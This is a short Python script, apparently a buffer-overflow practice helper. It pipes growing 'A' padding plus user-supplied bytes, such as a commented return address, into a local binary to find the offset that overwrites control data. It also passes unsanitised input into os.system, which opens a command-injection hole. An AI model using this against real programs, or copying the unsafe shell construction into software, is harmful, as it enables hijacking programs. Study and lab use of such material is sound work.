import os

# test_bytes = "\\xf6\\x91\\x04\\x08"

bytes_to_push = input("Input bytes: ")
test_range = range(int(input("Input test range upper limit: ")))
binary = input("Input the name of the binary: ")

for i in test_range:
	a = "A" * (i * 4)
	os.system(f"python -c 'import sys; sys.stdout.buffer.write(b\"{a}\" + b\"{bytes_to_push}\")' | ./{binary}")